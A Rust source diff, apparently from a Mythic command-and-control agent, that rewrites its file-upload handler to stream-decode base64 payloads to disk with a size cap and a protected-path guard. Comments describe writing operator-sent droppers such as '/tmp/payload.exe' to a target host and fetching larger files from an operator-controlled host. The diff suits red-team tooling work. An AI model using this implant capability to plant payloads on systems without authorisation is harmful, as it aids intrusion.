@@ -1,9 +1,14 @@
 //! File upload (Mythic → agent).
 //!
-//! Receives base64-encoded file bytes in task parameters, decodes them, and
-//! writes to the target path. Enforces a hard size cap to prevent OOM from
-//! oversized `file_bytes` payloads, and refuses writes to obviously
-//! destructive locations unless the operator sets `allow_system_path: true`.
+//! Receives base64-encoded file bytes in task parameters, decodes them
+//! **incrementally** with [`base64::DecoderReader`], and streams the result
+//! to disk via a buffered writer. No allocation holds the full decoded
+//! payload — memory is bounded to ~16 KiB regardless of upload size.
+//!
+//! Enforces a hard size cap (default 256 MiB) to prevent the agent from
+//! filling the disk if the operator sends an oversized dropper, and refuses
+//! writes to obviously destructive locations unless the operator sets
+//! `allow_system_path: true`.
 //!
 //! Task parameters (JSON):
 //! ```json
@@ -11,16 +16,20 @@
 //!     "path": "/tmp/payload.exe",
 //!     "file_bytes": "<base64_encoded_contents>",
 //!     "host": "optional-hostname",
-//!     "allow_system_path": false   // optional, default false
+//!     "allow_system_path": false,  // optional, default false
+//!     "max_bytes": 268435456        // optional, override cap (default 256 MiB)
 //! }
 //! ```
 
+use std::io::{Read, Write};
 use std::path::Path;
 
+use base64::engine::general_purpose::STANDARD;
+use base64::read::DecoderReader;
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
-use crate::common::base64::decode as decode_b64;
+use crate::common::pathguard::is_protected_path;
 
 // ── Params ──────────────────────────────────────────────────
 
@@ -37,47 +46,21 @@ struct Params {
     /// usually destructive to overwrite. Default false.
     #[serde(default)]
     allow_system_path: bool,
+    /// Override the decoded-size cap. Clamped to [1, MAX_UPLOAD_BYTES].
+    #[serde(default)]
+    max_bytes: Option<u64>,
 }
 
 // ── Constants ───────────────────────────────────────────────
 
-/// Hard cap on decoded upload size to keep base64 decode + Vec allocation
-/// bounded. 256 MiB is enough for typical tooling droppers; larger transfers
-/// should use `wget` against an operator-controlled host.
-const MAX_UPLOAD_BYTES: usize = 256 * 1024 * 1024;
-
-/// Path prefixes (lowercased) that require `allow_system_path: true`.
-/// Matches both Windows and Unix conventions. Comparison is on the lowercased
-/// path string.
-const PROTECTED_PREFIXES: &[&str] = &[
-    "/boot",
-    "/etc",
-    "/usr",
-    "/var",
-    "/bin",
-    "/sbin",
-    "/lib",
-    "/lib64",
-    "c:\\windows",
-    "c:\\program files",
-    "c:\\programdata",
-];
-
-// ── Helpers ─────────────────────────────────────────────────
-
-/// Returns true if `path` lands under a protected system directory.
-fn is_protected_path(path: &str) -> bool {
-    let lower = path.to_lowercase();
-    // Normalize Windows backslashes for prefix matching
-    let normalized = if cfg!(windows) {
-        lower.replace('/', "\\")
-    } else {
-        lower
-    };
-    PROTECTED_PREFIXES
-        .iter()
-        .any(|prefix| normalized.starts_with(prefix))
-}
+/// Hard cap on decoded upload size. 256 MiB is enough for typical tooling
+/// droppers; larger transfers should use `wget` against an
+/// operator-controlled host. Memory is bounded to ~16 KiB regardless
+/// (buffered reader + writer).
+const MAX_UPLOAD_BYTES: u64 = 256 * 1024 * 1024;
+/// Read chunk for the base64 DecoderReader. 16 KiB balances syscall
+/// overhead against memory footprint.
+const DECODE_CHUNK: usize = 16 * 1024;
 
 // ── Main handler ────────────────────────────────────────────
 
@@ -87,26 +70,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Err(e) => return TaskResponse::failed(task.id, &format!("upload parse error: {e}")),
     };
 
-    // 1. Decode base64
-    let data = match decode_b64(&params.file_bytes) {
-        Ok(d) => d,
-        Err(e) => return TaskResponse::failed(task.id, &e),
-    };
-
-    // 2. Size guard — guard before allocation (decode_b64 may already have
-    //    allocated, so size is checked here on the decoded Vec).
-    if data.len() > MAX_UPLOAD_BYTES {
-        return TaskResponse::failed(
-            task.id,
-            &format!(
-                "upload too large: {} bytes (max {}); use wget for larger files",
-                data.len(),
-                MAX_UPLOAD_BYTES
-            ),
-        );
-    }
-
-    // 3. Path guard — refuse to overwrite system paths unless explicit opt-in.
+    // 1. Path guard — refuse to overwrite system paths unless explicit opt-in.
     let path = Path::new(&params.path);
     if !params.allow_system_path && is_protected_path(&params.path) {
         return TaskResponse::failed(
@@ -118,7 +82,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         );
     }
 
-    // 4. Create parent directories if needed
+    // 2. Create parent directories if needed
     if let Some(parent) = path.parent() {
         if !parent.as_os_str().is_empty() {
             if let Err(e) = std::fs::create_dir_all(parent) {
@@ -130,19 +94,68 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         }
     }
 
-    // 5. Write file
-    match std::fs::write(path, &data) {
-        Ok(_) => {
-            info!("[upload] wrote {} bytes to {}", data.len(), path.display());
-            TaskResponse {
-                task_id: task.id,
-                completed: Some(true),
-                status: Some("completed".into()),
-                user_output: Some(format!("uploaded {} bytes to {}", data.len(), path.display())),
-                ..Default::default()
-            }
+    let cap = params
+        .max_bytes
+        .unwrap_or(MAX_UPLOAD_BYTES)
+        .clamp(1, MAX_UPLOAD_BYTES);
+
+    // 3. Stream-decode base64 to disk. DecoderReader pulls from the input
+    //    cursor and yields decoded bytes on demand — we never materialise
+    //    the full decoded Vec.
+    let cursor = std::io::Cursor::new(params.file_bytes.as_bytes());
+    let mut decoder = DecoderReader::new(cursor, &STANDARD);
+
+    let file = match std::fs::File::create(path) {
+        Ok(f) => f,
+        Err(e) => {
+            return TaskResponse::failed(task.id, &format!("create {} failed: {e}", path.display()))
         }
-        Err(e) => TaskResponse::failed(task.id, &format!("write {} failed: {e}", path.display())),
+    };
+    let mut writer = std::io::BufWriter::new(file);
+
+    let mut buf = [0u8; DECODE_CHUNK];
+    let mut written: u64 = 0;
+    let decode_result: std::io::Result<()> = (|| {
+        loop {
+            let n = decoder
+                .read(&mut buf)
+                .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
+            if n == 0 {
+                break;
+            }
+            written += n as u64;
+            if written > cap {
+                return Err(std::io::Error::new(
+                    std::io::ErrorKind::InvalidData,
+                    format!("decoded size exceeds cap {cap}"),
+                ));
+            }
+            writer.write_all(&buf[..n])?;
+        }
+        writer.flush()?;
+        Ok(())
+    })();
+
+    if let Err(e) = decode_result {
+        // Best-effort cleanup of the partial file.
+        let _ = std::fs::remove_file(path);
+        return TaskResponse::failed(
+            task.id,
+            &format!("upload {} failed: {e}", path.display()),
+        );
+    }
+
+    info!("[upload] wrote {} bytes to {}", written, path.display());
+    TaskResponse {
+        task_id: task.id,
+        completed: Some(true),
+        status: Some("completed".into()),
+        user_output: Some(format!(
+            "uploaded {} bytes to {}",
+            written,
+            path.display()
+        )),
+        ..Default::default()
     }
 }
 
